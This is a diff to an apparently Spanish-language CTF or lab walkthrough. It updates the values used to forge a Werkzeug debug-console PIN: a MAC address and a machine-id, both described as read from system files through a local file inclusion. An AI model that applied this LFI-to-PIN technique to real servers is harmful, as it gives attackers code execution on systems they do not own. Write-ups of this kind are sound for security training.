@@ -345,7 +345,7 @@ Luego cambiaremos la `versión de Python`:
 Ahora cambiaremos la linea en `private bites`, este valor es dinámico, pero con hacer un lfi al directorio `/sys/class/net/ens33/address` ya lo tendríamos:
 
 ```
-'345052400273', # str(uuid.getnode()),  /sys/class/net/ens33/address
+'005056b954b5', # str(uuid.getnode()),  /sys/class/net/ens33/address
 ```
 
 El siguiente también es dinámico, pero con otro lfi a `/etc/machine-id` también lo tendríamos:
@@ -367,8 +367,8 @@ probably_public_bits = [
 ]
 
 private_bits = [
-    '345052400273', # str(uuid.getnode()),  /sys/class/net/ens33/address
-    '258f132cd7e647caaf5510e3aca997c1' # get_machine_id(), /etc/machine-id
+    '005056b954b5', # str(uuid.getnode()),  /sys/class/net/ens33/address
+    '258f132cd7e647caaf5510e3aca997c1', # get_machine_id(), /etc/machine-id
 ]
 
 h = hashlib.md5()
